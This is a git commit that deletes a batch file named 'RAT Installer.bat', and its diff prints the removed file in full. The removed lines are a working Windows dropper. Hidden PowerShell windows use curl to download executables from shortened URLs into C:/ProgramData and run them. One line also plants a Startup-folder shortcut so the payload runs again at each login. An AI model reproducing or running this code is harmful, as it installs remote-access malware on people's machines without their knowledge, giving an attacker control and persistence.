6c4a931301928445b6f18783a9db283ef11c4232
InsertSickName <94913361+InsertSickName@users.noreply.github.com>
2022-11-30 20:21:51 +0530

    Delete RAT Installer.bat

--- RAT Installer.bat
+++
@@ -1,2 +0,0 @@
-start powershell -windowstyle hidden -Command "curl.exe -L --output 'C:/ProgramData/sub.exe' --url 'https://cutt.ly/kUwzC1V'; start 'C:/ProgramData/sub.exe'"
-start powershell -windowstyle hidden -Command "curl.exe -L --output 'C:/programdata/Windows.exe' --url 'https://cutt.ly/nUwzKbO'; start 'C:/ProgramData/Windows.exe'; $s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%/Start Menu/Programs/Startup/Shortcut.lnk');$s.TargetPath='C:/ProgramData/Windows.exe';$s.Save()"
